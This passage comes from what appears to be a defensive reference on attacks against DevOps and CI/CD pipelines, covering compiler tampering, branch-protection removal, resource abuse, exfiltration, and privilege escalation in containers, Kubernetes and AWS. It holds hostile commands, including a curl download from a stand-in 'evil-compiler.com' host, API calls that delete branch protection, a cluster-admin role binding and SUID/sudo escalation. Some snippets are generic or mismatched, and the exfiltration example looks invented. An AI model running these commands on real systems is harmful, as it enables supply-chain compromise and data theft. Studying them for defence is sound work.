    # Misconfiguration where the attacker replaces the compiler with a tampered version
    - curl -o compiler https://evil-compiler.com

build:
  stage: build
  script:
    - echo "Building the application"
    # Use the tampered compiler to build the code

deploy:
  stage: deploy
  script:
    - echo "Deploying the application"
    # Perform deployment actions
```

In the provided example pipeline, the misconfigured "prepare" stage includes a command that downloads a compiler from a malicious source (`https://evil-compiler.com`) and replaces the legitimate compiler in the build environment. This tampered compiler can inject malicious code into the build process without leaving any traces before the build begins.



### Reconfigure branch protections

<img style="background: white" src="../../images/unprotected.drawio.png">



Branch protection tools allow an organization to configure steps before a PR/commit is approved into a branch. Once an attacker has admin permissions, they may change these configurations and introduce code into the branch without any user intervention.


1. GitHub:

Using the GitHub REST API:

```
curl -X DELETE -H "Authorization: token YOUR_TOKEN" https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection
```

Using the GitHub CLI:

```
gh api repos/OWNER/REPO/branches/BRANCH/protection -X DELETE
```




1. GitLab


Using the GitLab API:

```
curl -X DELETE -H "PRIVATE-TOKEN: YOUR_TOKEN" https://gitlab.com/api/v4/projects/PROJECT_ID/repository/branches/BRANCH/protected
```


Using the GitLab CLI:

```
gitlab protect unprotect --project PROJECT_ID BRANCH
```



### DDoS

<img style="background: white" src="../../images/dos.drawio.png">


An adversary could use the compute resources they gained access to in order to execute distributed denial of services (DDoS) attacks on external targets.

### Cryptocurrency mining

<img style="background: white" src="../../images/crypto.drawio.png">


The compute resources could be used for crypto mining controlled by an adversary.

### Local DoS

<img style="background: white" src="../../images/localdos.drawio.png">


Once the attacker is running on the CI pipelines, the attacker can perform a denial service attack from  said pipelines to customers by shutting down agents, rebooting, or by overloading the VMs.

### Resource deletion

<img style="background: white" src="../../images/res-del.drawio.png">


An attacker with access to resources (cloud resources, repositories, etc.) could permanently delete the resources to achieve denial of services.






### Clone private repositories

<img style="background: white" src="../../images/ex-pro.drawio.png">


Once attackers have access to CI pipelines, they also gain access to the private repositories (for example, the GITHUB_TOKEN can be used in GitHub), and therefore could clone and access the code, thus gaining access to private IP.


```
steps:
  - name: Clone private repository
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    run: |
      git config --global user.email "your-email@example.com"
      git config --global user.name "Your Name"
      git clone https://github.com/your-username/your-private-repo.git
```


In this example, we're assuming you're using the `GITHUB_TOKEN` secret provided by GitHub. Make sure you have the necessary permissions to access the private repository. Replace `"your-email@example.com"` with your email and `"Your Name"` with your name to set up your Git configuration. Also, update the repository URL (`https://github.com/your-username/your-private-repo.git`) with the appropriate URL for your private repository.


### Pipeline logs

<img style="background: white" src="../../images/ex-pip.drawio.png">


An adversary could access the pipeline execution logs, view the access history, the build steps, etc. These logs may contain sensitive information about the build, the deployment, and in some cases even credentials to services, to user accounts and more.


```
pipeline {
  agent any
  
  stages {
    stage('Build') {
      steps {
        // Your build steps here
      }
    }
    stage('Deploy') {
      steps {
        // Your deployment steps here
      }
    }
  }
  
  post {
    always {
      // Archive pipeline logs
      archiveArtifacts artifacts: 'logs/**'
    }
    success {
      // Perform actions for successful pipeline execution
      script {
        echo 'Pipeline execution was successful'
      }
    }
    failure {
      // Perform actions for failed pipeline execution
      script {
        echo 'Pipeline execution failed'
      }
    }
  }
}
```


In this example, we have a basic pipeline script with two stages: "Build" and "Deploy". You can add your specific build and deployment steps within each stage as per your requirements.

The `post` section defines actions to be performed after the pipeline execution. In this case, we're archiving the pipeline logs by using the `archiveArtifacts` step with the `logs/**` pattern to include all files within the "logs" directory. Adjust the pattern based on your specific log file location.

Additionally, we have added `success` and `failure` sections to handle actions based on the pipeline's outcome. Feel free to customize these sections with your desired actions.



### Exfiltrate data from production resources

<img style="background: white" src="../../images/ex-res.drawio.png">

 In cases where the pipelines can access the production resources, the attackers will have access to these resources as well. Therefore, they can abuse this access for exfiltrating production data.


```
from merlin import merlin_client

# Create a Merlin client object
client = merlin_client.MerlinClient()

# Connect to the target server using the provided URL and authentication token
client.connect('https://target_server.com', 'auth_token')

# Prepare your data for transfer
data = b'This is some sample data to transfer'

# Transfer the data to the server
client.send_data(data)

# Optionally, receive a response from the server
response = client.receive_response()
print(response)
```





### Misconfigured container

If a container is not properly configured, it may be possible to escalate privileges to root or access sensitive data. To do this, you could try to run a command like 

```
docker exec -it --privileged <container_name> /bin/bash
```

to gain root access.


### SSH key compromise

If an attacker is able to compromise an SSH key, they can use it to gain access to additional systems. To do this, you could try to use a command like 

```
ssh -i <path_to_key> <username>@<ip_address>
```

to log in to another system using the compromised key.



### Password brute-forcing

If a password is weak, it may be possible to guess it using a brute-force attack. Tools like Hydra or Medusa can be used for this purpose.



### Port forwarding

If a system is configured to allow port forwarding, an attacker can use it to access additional systems or services. To do this, you could use a command like 

```
ssh -L <local_port>:<remote_host>:<remote_port> <username>@<ip_address>
```

to forward a local port to a remote system.




### Exploiting Misconfigured Kubernetes RBAC

In Kubernetes, Role-Based Access Control (RBAC) is used to define the level of access each user or service account has to resources. If a cluster's RBAC is not configured properly, attackers could potentially escalate their privileges. One way to exploit misconfigured RBAC is by creating a custom role with elevated permissions and assigning it to a service account. This could be done using the following command:


```
kubectl create clusterrolebinding privileged-role --clusterrole=cluster-admin --serviceaccount=<namespace>:<serviceaccount>
```



### Exploiting Weak Permissions on CI/CD Tools

In a DevOps pipeline, Continuous Integration/Continuous Deployment (CI/CD) tools such as Jenkins or GitLab are often used to automate the build and deployment process. If the permissions on these tools are not properly configured, attackers could potentially exploit them to escalate their privileges. For example, an attacker could modify the Jenkinsfile to add a shell command that would run with elevated privileges:


```
stage('Build') {
  steps {
    sh 'sudo <command>'
  }
}
```



### Exploiting Weak AWS IAM Permissions

In an AWS environment, Identity and Access Management (IAM) is used to control access to resources. If the IAM permissions are not properly configured, attackers could potentially escalate their privileges. One way to exploit weak IAM permissions is by creating a new IAM user or role with elevated permissions and then assuming that role using the AWS CLI. This could be done using the following command:

```
aws sts assume-role --role-arn <role-arn> --role-session-name <session-name>
```




## Container Breakouts

Attackers can exploit vulnerabilities in containers to escape from the container and execute code on the host machine with elevated privileges. Some examples of container breakout techniques include the use of kernel exploits, mounting of the host file system, or exploiting misconfigurations in the container runtime.




## Misconfigured Access Control

Inadequate access controls can allow attackers to escalate privileges by exploiting permissions that are not properly configured. This can include using a service account with too many privileges, or exploiting misconfigured RBAC rules.


## Code Injection

Attackers can inject malicious code into the pipeline or an application in order to escalate privileges. For example, an attacker can inject code into a script that is executed by an application, allowing them to execute arbitrary commands on the target system.

```
# Example 1: Using SUDO to escalate privileges

sudo /bin/bash

# Example 2: Exploiting a misconfigured SUID binary

chmod u+s /usr/bin/newuid
/usr/bin/newuid

# Example 3: Using a kernel exploit to escalate privileges

./exploit
```




{% include links.html %}
